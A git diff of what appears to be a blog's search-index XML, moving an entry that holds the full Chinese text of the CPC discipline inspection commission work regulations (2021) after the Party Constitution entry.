-<p>  对于各级纪律检查委员会立案审查的党员，需要给予纪律处分的，一般由负责审查的纪委提出处分意见，经被审查人所在党支部的党员大会讨论形成决议，并按照规定报党的基层委员会批准或者有权处分的党组织审批。在特殊情况下，县级和县级以上各级纪委有权直接决定给予党员纪律处分，主要包括：案情涉密、敏感；违纪案件跨地区跨部门跨单位；违纪党员所在的基层党组织无法正常履行职责、不正确履行职责或者其负责人同违纪问题有关联；违纪党员为县级或者县级以上各级党委管理的党员干部；党章和其他党内法规明确规定的相关情况。</p>
-<p>  地方各级纪律检查委员会和基层纪律检查委员会对同级党的委员会处理案件的决定有不同意见的，可以请求上一级纪委予以复查。</p>
-<p>  建立健全处分决定执行公示、回访教育、情况报告和专项检查等制度，加强与相关党组织及职能部门的协作沟通，确保处分决定得到严格执行。</p>
-<p>  <strong>第三十八条</strong>　党的纪律检查委员会发现党组织、党的领导干部在党的建设、党的事业中失职失责的，应当依据相关党内法规开展问责调查，查明失职失责问题，向党的委员会提出责任追究的建议，或者按照规定的权限和程序作出问责决定。</p>
-<p>  <strong>第三十九条</strong>　党的纪律检查委员会对于党员因合法权益受到党组织或者其他党员侵害提出的控告，按照规定予以受理，及时恰当进行处理。通过办理党员的控告发现的违纪违法问题，按照本章规定进行检查和处理。</p>
-<p>  对于党员因不服纪委或者其他党组织给予本人的处理、处分而提出的申诉，按照规定予以受理，进行复议复查。</p>
-<p>  <strong>第四十条</strong>　党的各级纪律检查委员会应当依据相关党内法规，加强对党组织和领导干部履行保障党员权利工作职责的监督检查，依规依纪查处侵犯党员权利的行为。开展监督执纪工作，应当落实保障党员权利的规定和要求。</p>
-<p>  <strong>第四十一条</strong>　在监督检查、纪律审查等过程中，应当注意查找分析监督对象所在党组织党风廉政建设、管理监督等方面存在的突出问题，采取制发纪律检查建议书或者其他适当方式，提出有关强化管党治党、净化政治生态、健全制度、整改纠正等意见建议，督促指导和推动有关地区、部门、单位党组织举一反三、切实整改。</p>
-<p>  对于涉及党的建设、党的事业的普遍性、倾向性问题，应当进行深入调研，形成专题报告，报送同级党委、上级纪委或者通报相关党组织，推动解决问题、规范决策、完善政策、健全制度。</p>
-<h2 id="第六章-派驻、派出机构"><a href="#第六章-派驻、派出机构" class="headerlink" title="第六章　派驻、派出机构"></a>第六章　派驻、派出机构</h2><p>  <strong>第四十二条</strong>　党的中央纪律检查委员会国家监察委员会、地方各级纪律检查委员会监察委员会向同级党和国家机关全面派驻纪检监察组，按照规定可以向国有企业、事业单位等其他组织和单位派驻纪检监察组。</p>
-<p>  党的中央和地方各级委员会派出党的机关工作委员会、街道工作委员会等代表机关的，党的中央纪律检查委员会国家监察委员会、地方各级纪律检查委员会监察委员会可以相应派出纪检监察工作委员会。</p>
-<p>  <strong>第四十三条</strong>　派驻机构是派出它的党的纪律检查委员会监察委员会的组成部分，由派出机关直接领导、统一管理。</p>
-<p>  派出机构在派出它的党的纪律检查委员会监察委员会和本级党的工作委员会双重领导下进行工作。派出机构按照规定开展纪律检查工作，领导管辖范围内机关纪委等纪检机构的工作。</p>
-<p>  <strong>第四十四条</strong>　派驻机构根据派出机关授权开展监督执纪问责工作：</p>
-<p>  （一）加强对驻在单位（含综合监督单位）的监督，重点对驻在单位领导班子及其成员、党组（党委）管理的领导班子及其成员等进行监督。</p>
-<p>  （二）监督促进驻在单位领导班子贯彻落实党的理论和路线方针政策、党中央决策部署，履行全面从严治党主体责任。</p>
-<p>  （三）经常、及时地向派出机关报告情况和问题。</p>
-<p>  （四）加强对驻在单位纪检机构的业务指导和监督检查，促进其履行监督责任。</p>
-<p>  （五）认真处理信访举报，对问题线索进行集中管理和处置。</p>
-<p>  （六）依规依纪开展纪律审查，严肃查处违纪问题。</p>
-<p>  （七）按照管理权限作出问责决定或者提出问责建议。</p>
-<p>  （八）协助驻在单位党组（党委）做好巡视巡察工作。</p>
-<p>  （九）完成派出机关交办的其他任务。</p>
-<p>  <strong>第四十五条</strong>　健全派驻监督工作机制，统筹协调派出机关内设监督检查室、派驻纪检监察组、地方纪检监察机关、巡视巡察机构等力量，通过“室组”联动监督、“室组地”联合办案等方式，提高派驻监督质量。</p>
-<p>  县（市、区）纪律检查委员会监察委员会开展派驻监督工作，应当保证派驻机构人员力量，推动监督工作向基层延伸，采取综合派驻、工作协作等方式，提升监督效能。</p>
-<h2 id="第七章-队伍建设和监督"><a href="#第七章-队伍建设和监督" class="headerlink" title="第七章　队伍建设和监督"></a>第七章　队伍建设和监督</h2><p>  <strong>第四十六条</strong>　党的各级纪律检查委员会必须坚持以习近平新时代中国特色社会主义思想武装头脑、指导实践、推动工作，突出抓好党的政治建设，教育引导纪检干部不断提高政治判断力、政治领悟力、政治执行力，带头践行“两个维护”，敢于善于斗争，做到忠诚干净担当。</p>
-<p>  <strong>第四十七条</strong>　贯彻新时代党的组织路线，坚持党管干部，严把干部准入关，加强思想淬炼、政治历练、实践锻炼、专业训练，加强理论研究和学科建设，提高把握政策、监督执纪、做思想政治工作等能力，建设高素质专业化干部队伍。</p>
-<p>  <strong>第四十八条</strong>　加强作风建设和纪律建设，保证纪检干部严守政治纪律和政治规矩，模范遵守党的纪律和国家法律，坚持实事求是，深入开展调查研究，密切联系群众，树立纪律严明、作风深入、工作扎实、谦虚谨慎、秉公执纪的良好形象。</p>
-<p>  <strong>第四十九条</strong>　加强监督执纪规范化建设，健全法规制度，规范工作流程，牢固树立法治意识、程序意识、证据意识，依规依纪依法行使纪律检查权。</p>
-<p>  <strong>第五十条</strong>　党的纪律检查委员会必须接受最严格的约束和监督，在同级党委和上级纪委的领导、监督下强化自我监督，自觉接受党的组织和党员的监督。建立完善监督检查、审查调查、案件监督管理、案件审理相互协调、相互制约的工作机制，发挥内设干部监督机构、机关纪委等作用，加大监管和自我净化力度，坚决防治“灯下黑”。</p>
-<p>  党的纪律检查委员会应当自觉接受民主监督、群众监督、舆论监督等各方面监督。任何单位和个人对纪检机关、纪检干部的违纪违法行为，有权提出检举、控告。</p>
-<p>  <strong>第五十一条</strong>　严格执行纪检干部打听案情、过问案件、说情干预问题报告制度，有关情况应当登记备案。</p>
-<p>  纪检干部发现审查组工作人员未经批准接触被审查人、涉案人员及其特定关系人，或者存在交往情形的，应当及时报告并登记备案。</p>
-<p>  <strong>第五十二条</strong>　办理纪检事项的纪检干部存在可能影响事项公正处理情形的，应当主动申请回避，被审查人、检举控告人以及其他有关人员也有权要求其回避。</p>
-<p>  <strong>第五十三条</strong>　纪检干部应当严格执行保密制度，不准私自留存、隐匿、查阅、摘抄、复制、携带问题线索和涉案资料，严禁泄露审查工作情况。</p>
-<p>  纪检干部离职的，应当严格遵守有关离职后从业限制的规定，三年内不得从事与纪律检查工作相关的职业。</p>
-<p>  <strong>第五十四条</strong>　建立健全安全责任制，严格防范发生审查安全事故。组织开展经常性检查和不定期抽查，发现问题及时督促整改。</p>
-<p>  <strong>第五十五条</strong>　纪检干部有以案谋私、跑风漏气、滥用职权以及其他违规违纪违法行为的，必须严肃查处；构成犯罪的，依法追究刑事责任。</p>
-<p>  纪检机关及其领导干部履行职责过程中失职失责造成严重后果或者恶劣影响的，应当严肃问责。</p>
-<h2 id="第八章-附则"><a href="#第八章-附则" class="headerlink" title="第八章　附则"></a>第八章　附则</h2><p>  <strong>第五十六条</strong>　新疆生产建设兵团党的各级纪律检查委员会，党的地区纪律检查委员会和相当于地区纪委的其他纪律检查委员会，党组（党委）纪检组（纪委），纪律检查委员，参照执行本条例。</p>
-<p>  <strong>第五十七条</strong>　中央军事委员会可以根据本条例，制定相关规定。</p>
-<p>  <strong>第五十八条</strong>　本条例由中央纪律检查委员会负责解释。</p>
-<p>  <strong>第五十九条</strong>　本条例自发布之日起施行。</p>
-]]></content>
-      <categories>
-        <category>综合法规</category>
-      </categories>
-      <tags>
-        <tag>综合法规</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>中国共产党章程（中国共产党第二十次全国代表大会部分修改，2022年10月22日通过）</title>
     <url>/2024/10/01/%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%AB%A0%E7%A8%8B%EF%BC%88%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%AC%AC%E4%BA%8C%E5%8D%81%E6%AC%A1%E5%85%A8%E5%9B%BD%E4%BB%A3%E8%A1%A8%E5%A4%A7%E4%BC%9A%E9%83%A8%E5%88%86%E4%BF%AE%E6%94%B9%EF%BC%8C2022%E5%B9%B410%E6%9C%8822%E6%97%A5%E9%80%9A%E8%BF%87%EF%BC%89/</url>
     <content><![CDATA[<h2 id="总纲"><a href="#总纲" class="headerlink" title="总纲"></a>总纲</h2><p>  中国共产党是中国工人阶级的先锋队，同时是中国人民和中华民族的先锋队，是中国特色社会主义事业的领导核心，代表中国先进生产力的发展要求，代表中国先进文化的前进方向，代表中国最广大人民的根本利益。党的最高理想和最终目标是实现共产主义。</p>
@@ -3954,6 +3982,199 @@ sudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span
 <h2 id="第十一章-党旗党徽"><a href="#第十一章-党旗党徽" class="headerlink" title="第十一章 党旗党徽"></a>第十一章 党旗党徽</h2><p>  <strong>第五十三条</strong>　中国共产党党徽为镰刀和锤头组成的图案。</p>
 <p>  <strong>第五十四条</strong>　中国共产党党旗为旗面缀有金黄色党徽图案的红旗。</p>
 <p>  <strong>第五十五条</strong>　中国共产党的党徽党旗是中国共产党的象征和标志。党的各级组织和每一个党员都要维护党徽党旗的尊严。要按照规定制作和使用党徽党旗。</p>
+]]></content>
+      <categories>
+        <category>综合法规</category>
+      </categories>
+      <tags>
+        <tag>综合法规</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>中国共产党纪律检查委员会工作条例（2021年12月24日）</title>
+    <url>/2025/08/03/%E4%B8%AD%E5%9B%BD%E5%85%B1%E4%BA%A7%E5%85%9A%E7%BA%AA%E5%BE%8B%E6%A3%80%E6%9F%A5%E5%A7%94%E5%91%98%E4%BC%9A%E5%B7%A5%E4%BD%9C%E6%9D%A1%E4%BE%8B%EF%BC%882021%E5%B9%B412%E6%9C%8824%E6%97%A5%EF%BC%89/</url>
+    <content><![CDATA[<p>（2021年12月6日中共中央政治局会议审议批准 2021年12月 24 日中共中央发布）</p>
+<h2 id="第一章-总则"><a href="#第一章-总则" class="headerlink" title="第一章　总则"></a>第一章　总则</h2><p>  <strong>第一条</strong>　为了加强和规范新时代党的纪律检查委员会工作，根据《中国共产党章程》，制定本条例。</p>
+<p>  <strong>第二条</strong>　党的各级纪律检查委员会高举中国特色社会主义伟大旗帜，以马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想为指导，增强“四个意识”、坚定“四个自信”、做到“两个维护”，不忘初心、牢记使命，深入贯彻全面从严治党战略方针，坚定不移推进党风廉政建设和反腐败斗争，构建一体推进不敢腐、不能腐、不想腐体制机制，从严从实加强自身建设，自觉接受监督，充分发挥监督保障执行、促进完善发展作用。</p>
+<p>  <strong>第三条</strong>　党的各级纪律检查委员会是党内监督专责机关，是党推进全面从严治党、开展党风廉政建设和反腐败斗争的专门力量。</p>
+<p>  党的各级纪律检查委员会的主要任务是：维护党的章程和其他党内法规，检查党的理论和路线方针政策、党中央决策部署执行情况，协助党的委员会推进全面从严治党、加强党风建设和组织协调反腐败工作。</p>
+<p>  党的各级纪律检查委员会把坚决维护习近平总书记党中央的核心、全党的核心地位，维护党中央权威和集中统一领导作为最高政治原则和根本政治责任。</p>
+<p>  <strong>第四条</strong>　党的各级纪律检查委员会遵循以下原则开展工作：</p>
+<p>  （一）坚持党的全面领导，坚持党中央集中统一领导。</p>
+<p>  （二）坚持以人民为中心，践行党的根本宗旨和群众路线。</p>
+<p>  （三）坚持民主集中制，实行集体领导和个人分工负责相结合的制度。</p>
+<p>  （四）坚持严的主基调，全面从严、一严到底。</p>
+<p>  （五）坚持实事求是，依规依纪依法履行职责。</p>
+<p>  （六）坚持惩前毖后、治病救人，实现政治效果、纪法效果、社会效果有机统一。</p>
+<h2 id="第二章-领导体制"><a href="#第二章-领导体制" class="headerlink" title="第二章　领导体制"></a>第二章　领导体制</h2><p>  <strong>第五条</strong>　党的中央纪律检查委员会（国家监察委员会）在党中央领导下进行工作，履行党的最高纪律检查机关（国家最高监察机关）职责。</p>
+<p>  党的中央纪律检查委员会严格执行加强和维护党中央集中统一领导的各项制度要求，及时向中央政治局、中央政治局常务委员会请示汇报工作，研究重大事项、重要问题以及作出立案审查决定、给予党纪处分等事项向党中央请示报告。执行党中央重要决定的情况应当专题报告。</p>
+<p>  <strong>第六条</strong>　党的地方各级纪律检查委员会和基层纪律检查委员会在同级党的委员会和上级纪律检查委员会双重领导下进行工作。</p>
+<p>  党的地方各级纪律检查委员会和基层纪律检查委员会应当落实同级党的委员会推进全面从严治党、加强党风廉政建设和反腐败工作的部署，执行同级党委作出的决定，及时向同级党委汇报工作，按照规定请示报告重大事项。</p>
+<p>  上级党的纪律检查委员会加强对下级纪律检查委员会的领导，对下级纪委的工作作出部署、提出要求；督促指导和支持下级纪委开展同级监督，检查下级纪委的工作，定期听取工作汇报，开展政治和业务培训；坚持查办腐败案件以上级纪委领导为主，按照规定审议和批准下级纪委关于线索处置、立案审查、纪律处分等的请示报告，按照程序改变下级纪委作出的错误或者不当的决定，必要时直接审查或者组织、指挥审查下级纪委管辖范围内有重大影响或者复杂的案件。</p>
+<p>  <strong>第七条</strong>　党的中央纪律检查委员会与国家监察委员会合署办公，党的地方各级纪律检查委员会与地方各级监察委员会合署办公，实行一套工作机构、两个机关名称，履行党的纪律检查和国家监察两项职责，实现纪委监委领导体制和工作机制的统一融合，集中决策、一体运行，坚持纪严于法，执纪执法贯通。</p>
+<h2 id="第三章-产生和运行"><a href="#第三章-产生和运行" class="headerlink" title="第三章　产生和运行"></a>第三章　产生和运行</h2><p>  <strong>第八条</strong>　党的中央纪律检查委员会由党的全国代表大会选举产生，每届任期和党的中央委员会任期相同。</p>
+<p>  党的中央纪律检查委员会全体会议，选举常务委员会和书记、副书记，并报党的中央委员会批准。</p>
+<p>  <strong>第九条</strong>　中央纪律检查委员会委员应当政治坚定、对党忠诚、敢于斗争、担当作为、清正廉洁，具备组织领导纪律检查工作、推进党风廉政建设和反腐败斗争的能力。</p>
+<p>  中央纪律检查委员会委员应当认真履行以下职责：</p>
+<p>  （一）参加中央纪委全体会议，积极发表意见、提出建议。</p>
+<p>  （二）在纪律检查机关担负具体工作的委员，应当模范履行岗位职责，高质量完成所承担的纪律检查工作。</p>
+<p>  （三）未在纪律检查机关担负具体工作的委员，应当支持和帮助本地区、本部门、本单位纪律检查机关开展工作；了解所在地区、部门、单位党组织和党员领导干部遵守党章党规党纪、贯彻落实党中央决策部署等情况，提出意见建议，重要问题及时向中央纪委常委会反映。</p>
+<p>  （四）对中央纪委的工作，以及中央纪委常委、其他中央纪委委员进行监督。</p>
+<p>  （五）承担中央纪委安排的其他任务。</p>
+<p>  <strong>第十条</strong>　党的中央纪律检查委员会通过召开全体会议的方式行使以下职权：</p>
+<p>  （一）制定贯彻落实党的全国代表大会和党中央决议决定的重大部署、重大措施。</p>
+<p>  （二）听取和审议常务委员会工作报告。</p>
+<p>  （三）选举常务委员会和书记、副书记。</p>
+<p>  （四）讨论和决定纪检监察工作的重大问题、重大事项。</p>
+<p>  （五）按照权限审议重要党内法规或者规范性文件。</p>
+<p>  （六）决定或者追认给予中央纪委委员撤销党内职务以上处分。</p>
+<p>  （七）研究决定常务委员会提请决定的事项，或者应当由全体会议决定的其他重要事项。</p>
+<p>  <strong>第十一条</strong>　党的中央纪律检查委员会全体会议每年至少召开一次，由中央纪律检查委员会常务委员会召集并主持。</p>
+<p>  党的中央纪律检查委员会全体会议应当有三分之二以上委员到会方可召开。委员因故不能参加会议的应当在会前请假，其意见可以用书面形式表达。根据需要，可以安排有关人员列席会议。</p>
+<p>  根据讨论和决定事项的不同，采用举手、无记名投票等方式进行表决，赞成票超过应到会委员半数的为通过。</p>
+<p>  对中央纪律检查委员会委员给予撤销党内职务以上处分，必须由应到会委员三分之二以上的多数决定，报党中央批准。</p>
+<p>  <strong>第十二条</strong>　中央纪律检查委员会常务委员会贯彻落实党中央决策部署，以及中央纪律检查委员会全体会议的决定和部署，向全体会议报告工作，接受监督。在全体会议闭会期间，行使中央纪律检查委员会职权，主要包括：</p>
+<p>  （一）讨论向党的全国代表大会的工作报告，向党中央请示报告工作，学习贯彻党中央决策部署。</p>
+<p>  （二）召集全体会议，对拟提交全体会议讨论和决定的事项先行审议、提出意见。</p>
+<p>  （三）讨论和决定纪检监察工作的重要问题、重要事项。</p>
+<p>  （四）按照权限审议党内法规或者规范性文件。</p>
+<p>  （五）听取以中央纪委名义立案审查的有关案件情况通报。</p>
+<p>  （六）按照权限讨论和决定对违犯党纪的党组织、党员处理、处分等事项。</p>
+<p>  （七）决定给予中央纪委委员撤销党内职务以上处分，并报党中央批准，待召开全体会议时予以追认。</p>
+<p>  （八）按照干部管理权限审议干部任免事项。</p>
+<p>  （九）研究决定应当由常务委员会决定的其他重要事项。</p>
+<p>  <strong>第十三条</strong>　中央纪律检查委员会常务委员会会议一般定期召开，遇有重要情况可以随时召开。</p>
+<p>  中央纪律检查委员会常务委员会会议由中央纪委书记召集并主持，会议议题由书记确定。</p>
+<p>  中央纪律检查委员会常务委员会会议应当有半数以上常委会委员到会方可召开。审议干部任免事项必须有三分之二以上常委会委员到会。根据需要，可以安排有关人员列席会议。</p>
+<p>  讨论和决定重要问题，应当进行表决。涉及多个事项的，应当逐项表决。表决可以根据讨论和决定事项的不同，采用口头、举手、无记名投票或者记名投票等方式进行，赞成票超过应到会常委会委员半数的为通过。</p>
+<p>  <strong>第十四条</strong>　中央纪律检查委员会办公会议一般定期召开，遇有重要情况可以随时召开。办公会议由中央纪委书记召集并主持，会议议题由书记确定，驻委的副书记、常委会委员及有关负责同志参加。办公会议研究或者决定以下事项：</p>
+<p>  （一）学习贯彻党中央决策部署。</p>
+<p>  （二）机关日常工作中需要研究、决定或者通报的重要事项。</p>
+<p>  （三）按照权限讨论和决定对违犯党纪的党的组织、党员处理、处分等事项。</p>
+<p>  （四）按照干部管理权限讨论和决定有关干部任免事项。</p>
+<p>  （五）其他需要提交办公会议讨论的重要事项。</p>
+<p>  <strong>第十五条</strong>　中央纪律检查委员会机关根据工作需要，设立必要的内设机构，依照有关规定配置机构职能和权限。</p>
+<p>  <strong>第十六条</strong>　党的地方各级纪律检查委员会由同级党的代表大会选举产生，每届任期和同级党的委员会任期相同。</p>
+<p>  党的地方各级纪律检查委员会全体会议，选举常务委员会和书记、副书记，并由同级党的委员会通过，报上级党的委员会批准。</p>
+<p>  上级党的委员会可以根据工作需要，在下级党的代表大会闭会期间，调动、任免下级纪律检查委员会书记、副书记。</p>
+<p>  <strong>第十七条</strong>　党的地方各级纪律检查委员会通过召开全体会议的方式行使以下职权：</p>
+<p>  （一）制定贯彻落实党中央决策部署以及中央纪委工作部署，同级党的代表大会和党委决议决定、上级纪委工作要求的重大措施。</p>
+<p>  （二）听取和审议常务委员会工作报告。</p>
+<p>  （三）选举常务委员会和书记、副书记。</p>
+<p>  （四）讨论和决定管辖范围内纪检监察工作的重大问题、重大事项。</p>
+<p>  （五）按照权限审议规范性文件。</p>
+<p>  （六）决定或者追认给予本级纪委委员撤销党内职务以上处分。</p>
+<p>  （七）研究决定常务委员会提请决定的事项，或者应当由全体会议决定的其他重要事项。</p>
+<p>  <strong>第十八条</strong>　地方各级纪律检查委员会常务委员会贯彻落实党中央决策部署以及中央纪委工作部署，落实同级党委、上级纪委、本级纪委全体会议的工作部署，向全体会议报告工作，接受监督。在全体会议闭会期间，行使本级纪律检查委员会职权，主要包括：</p>
+<p>  （一）讨论向同级党的代表大会的工作报告，向同级党委和上级纪委请示报告工作。</p>
+<p>  （二）召集全体会议，对拟提交全体会议讨论和决定的事项先行审议、提出意见。</p>
+<p>  （三）讨论和决定管辖范围内纪检监察工作的重要问题、重要事项。</p>
+<p>  （四）按照权限审议规范性文件。</p>
+<p>  （五）听取以本级纪委名义立案审查的有关案件情况通报。</p>
+<p>  （六）按照权限讨论和决定对违犯党纪的党组织、党员处理、处分等事项。</p>
+<p>  （七）决定给予本级纪委委员撤销党内职务以上处分，并报同级党委批准后，按照规定报上一级纪委备案或者批准，待召开本级纪委全体会议时予以追认。</p>
+<p>  （八）按照干部管理权限审议干部任免事项。</p>
+<p>  （九）研究决定应当由常务委员会决定的其他重要事项。</p>
+<p>  <strong>第十九条</strong>　地方各级纪律检查委员会委员的任职条件、履职要求，全体会议和常务委员会会议的召开、表决，以及机关机构设置等事项，参照本条例第九条、第十一条、第十三条、第十五条的规定执行。</p>
+<p>  <strong>第二十条</strong>　党的基层委员会是设立纪律检查委员会，还是设立纪律检查委员，由它的上一级党组织根据有关规定和具体情况决定。</p>
+<p>  党的基层纪律检查委员会由党员大会或者党员代表大会选举产生，每届任期和同级党的委员会任期相同。</p>
+<p>  党的基层纪律检查委员会选出的书记、副书记，经同级党的委员会通过后，报上级党组织批准。</p>
+<p>  基层纪律检查委员会委员的任职条件、履职要求等事项，按照有关规定执行。</p>
+<p>  <strong>第二十一条</strong>　党的基层纪律检查委员会根据需要及时召开全体会议，传达学习党中央决策部署以及中央纪委工作部署，传达学习同级党委和上级纪委的工作部署，提出贯彻落实的具体措施，研究讨论管辖范围内纪律检查工作的重要问题、重要事项，按照权限讨论或者决定对违犯党纪的党组织、党员处理、处分等事项。</p>
+<p>  <strong>第二十二条</strong>　乡镇和企业、机关、高校等单位中的党的基层纪律检查委员会应当按照党章、本条例和其他党内法规的有关规定，结合实际建立健全议事规则、工作制度，注重发挥纪委委员在监督执纪、议事决策方面的作用，根据工作需要可以组织纪委委员参与监督执纪有关事项。</p>
+<p>  党的基层纪律检查委员会可以按照有关规定，设立必要的工作机构，配备专职工作人员。</p>
+<p>  党的基层纪律检查委员会应当指导和督促同级党的委员会所属基层党组织纪律检查委员履行职责、发挥作用。</p>
+<p>  <strong>第二十三条</strong>　因调离本地区、辞去公职、退休等原因不适宜继续担任纪律检查委员会委员职务的，应当辞去或者按照程序免去其纪委委员职务。死亡、丧失国籍、被追究刑事责任、被停止党籍、受到撤销党内职务以上处分的，其纪委委员职务自动终止。辞去、免去或者自动终止地方纪委委员、基层纪委委员职务的，应当报上一级党的委员会备案。</p>
+<h2 id="第四章-主要任务"><a href="#第四章-主要任务" class="headerlink" title="第四章　主要任务"></a>第四章　主要任务</h2><p>  <strong>第二十四条</strong>　党的各级纪律检查委员会坚定维护党章，促进党组织和党员牢固树立党章意识、严格遵守党章规定，发挥党章作为管党治党总章程的作用，以严明的纪律巩固党的团结统一。切实维护各项党内法规，有规必依、执规必严、违规必究，保证党内法规得到有效执行，促进依规治党。</p>
+<p>  <strong>第二十五条</strong>　党的各级纪律检查委员会检查党的理论和路线方针政策的执行情况，坚持服务党和国家工作大局，坚决维护党中央权威和集中统一领导，推动党组织和党员统一意志、统一行动。加强对党中央决策部署落实情况的监督检查，坚持跟进监督、精准监督、全程监督，督促党组织和党员履职尽责、担当作为，确保党中央政令畅通、令行禁止。</p>
+<p>  <strong>第二十六条</strong>　党的各级纪律检查委员会协助同级党的委员会推进全面从严治党：</p>
+<p>  （一）协助同级党委制定全面从严治党规划、计划，推动各项工作落实。</p>
+<p>  （二）推动全面从严治党主体责任制度执行，检查同级党委领导班子成员包括“一把手”管党治党责任落实情况，监督下级党组织落实主体责任情况。</p>
+<p>  （三）加强对同级党委领导班子监督，发现班子成员包括“一把手”履职尽责、廉洁自律等方面重要问题，按照规定如实报告。</p>
+<p>  （四）协助同级党委加强对本地区本单位政治生态、党风廉政等情况分析，有关问题向同级党委报告并提出意见建议。</p>
+<p>  （五）协助同级党委开展巡视巡察工作。</p>
+<p>  （六）对日常监督、巡视巡察、审计监督等发现问题整改情况开展检查，通过加强监督推动整改常态化。</p>
+<p>  （七）协助起草相关党内法规和规范性文件。</p>
+<p>  （八）参与党委组织的管党治党有关专项工作。</p>
+<p>  坚持履行协助职责和监督责任有机结合，促进全面从严治党党委主体责任和纪委监督责任贯通协同。</p>
+<p>  <strong>第二十七条</strong>　党的各级纪律检查委员会协助同级党的委员会加强党风建设，锲而不舍落实中央八项规定精神，大力弘扬党的光荣传统和优良作风，驰而不息纠治形式主义、官僚主义、享乐主义和奢靡之风，坚决纠正损害群众利益的不正之风，保持党同人民群众的血肉联系。</p>
+<p>  <strong>第二十八条</strong>　党的各级纪律检查委员会协助同级党的委员会组织协调反腐败工作，坚定不移推进反腐败斗争，坚持和完善党中央集中统一领导、各级党委统筹指挥、纪委监委组织协调、职能部门高效协同、人民群众支持参与的反腐败工作体制机制。</p>
+<p>  发挥党委反腐败协调机构的统筹协调作用，开展反腐败国际追逃追赃等工作，加强相关部门协作配合，增强反腐败整体合力。</p>
+<p>  <strong>第二十九条</strong>　党的纪律检查工作坚持把一体推进不敢腐、不能腐、不想腐作为反腐败斗争的基本方针、新时代全面从严治党的重要方略，惩治震慑、制度约束、提高觉悟一体发力，系统施治、标本兼治，努力取得更多制度性成果和更大治理成效：</p>
+<p>  （一）坚持无禁区、全覆盖、零容忍，坚持重遏制、强高压、长震慑，坚持受贿行贿一起查，巩固不敢腐。</p>
+<p>  （二）坚持将惩治腐败与深化改革、促进治理贯通起来，深入查找制度和体制机制存在的问题，推动补齐制度短板、堵塞监管漏洞、规范权力运行，强化不能腐。</p>
+<p>  （三）坚持教育党员、干部坚定理想信念宗旨，提高党性觉悟，提升道德修养，涵养廉洁文化，筑牢思想上拒腐防变的堤坝，自觉不想腐。</p>
+<p>  <strong>第三十条</strong>　发挥党的纪律检查工作在党和国家监督体系中的重要作用，强化对权力运行的制约和监督，重点加强对领导干部特别是主要领导干部的监督，提升监督全覆盖质量，增强监督的政治性、严肃性、协同性、有效性。</p>
+<p>  深化纪检监察体制改革，推进纪律监督、监察监督、派驻监督、巡视监督统筹衔接，整合运用监督力量，构建系统集成、协同高效的监督机制。坚持以党内监督为主导，促进人大监督、民主监督、行政监督、司法监督、审计监督、财会监督、统计监督、群众监督、舆论监督等各类监督有机贯通、相互协调，健全信息沟通、线索移交、措施配合、成果共享等机制，形成常态长效的监督合力。</p>
+<h2 id="第五章-工作职责"><a href="#第五章-工作职责" class="headerlink" title="第五章　工作职责"></a>第五章　工作职责</h2><p>  <strong>第三十一条</strong>　党的各级纪律检查委员会围绕实现党章赋予的任务，坚持聚焦主责主业，履行监督、执纪、问责职责。</p>
+<p>  坚持把监督作为基本职责，抓早抓小、防微杜渐，综合考虑错误性质、情节后果、主观态度等因素，依规依纪依法、精准有效运用监督执纪“四种形态”：</p>
+<p>  （一）党员、干部有作风纪律方面的苗头性、倾向性问题或者轻微违纪问题，或者有一般违纪问题但具备免予处分情形的，运用监督执纪第一种形态，按照规定进行谈话提醒、批评教育、责令检查等，或者予以诫勉。</p>
+<p>  （二）党员、干部有一般违纪问题，或者违纪问题严重但具有主动交代等从轻减轻处分情形的，运用监督执纪第二种形态，按照规定给予警告、严重警告处分，或者建议单处、并处停职检查、调整职务、责令辞职、免职等处理。</p>
+<p>  （三）党员、干部有严重违纪问题，或者严重违纪并构成严重职务违法的，运用监督执纪第三种形态，按照规定给予撤销党内职务、留党察看、开除党籍处分，同时建议给予降职或者依法给予撤职、开除公职、调整其享受的待遇等处理。</p>
+<p>  （四）党员、干部严重违纪、涉嫌犯罪的，运用监督执纪第四种形态，按照规定给予开除党籍处分，同时依法给予开除公职、调整或者取消其享受的待遇等处理，再移送司法机关依法追究刑事责任。</p>
+<p>  <strong>第三十二条</strong>　党的各级纪律检查委员会应当把自觉遵守纪律的教育作为基础性工作，经常开展党章党规教育，强化党的政治纪律、组织纪律、廉洁纪律、群众纪律、工作纪律、生活纪律教育，深入开展警示教育，以案明纪、以案说法。</p>
+<p>  开展廉政教育，加强全面从严治党、党风廉政建设和反腐败工作的形势任务以及家风家教等宣传教育，推进廉洁文化建设，营造崇廉拒腐氛围。</p>
+<p>　　根据形势需要，着眼保障党的中心工作，作出维护党纪的决定，制定相关法规文件，严明纪律要求，教育、引导和规范党组织、党员行为。</p>
+<p>  <strong>第三十三条</strong>　党的纪律检查委员会应当强化政治监督，重点监督党组织、党员特别是领导干部以下情况：</p>
+<p>  （一）对党忠诚，坚持党的领导，贯彻落实党的理论和路线方针政策、党中央决策部署，践行“两个维护”的情况。</p>
+<p>  （二）坚定理想信念宗旨，牢记初心使命，践行入党誓词，坚持中国特色社会主义制度的情况。</p>
+<p>  （三）落实全面从严治党主体责任和监督责任的情况。</p>
+<p>  （四）贯彻执行民主集中制，公正用权、依法用权、廉洁用权、担当作为的情况。</p>
+<p>  政治监督应当突出“关键少数”，重点加强对“一把手”、同级党委特别是常委会委员的监督。</p>
+<p>  <strong>第三十四条</strong>　党的纪律检查委员会应当加强日常监督，监督方式主要包括：座谈，召集、参加或者列席会议，了解党内同志和社会群众反映；查阅查询相关资料和信息数据；现场调查，驻点监督；督促巡视巡察整改；谈心谈话，听取工作汇报，听取述责述廉；建立健全党员领导干部廉政档案，开展党风廉政意见回复等工作。</p>
+<p>  开展专项监督，针对落实党中央决策部署中的突出问题，行业性、系统性、区域性的管党治党重点问题，形式主义、官僚主义、享乐主义和奢靡之风问题，群众反映强烈、损害群众利益的突出问题加强监督检查。必要时，可以组织、参加或者督促开展集中整治、专项治理。</p>
+<p>  加强基层监督，促进基层监督资源和力量整合，发挥纪检监察、巡察等作用，有效衔接村（居）务监督，建立监督信息网络平台，扩大群众参与，及时发现、处理群众身边的腐败问题和不正之风。</p>
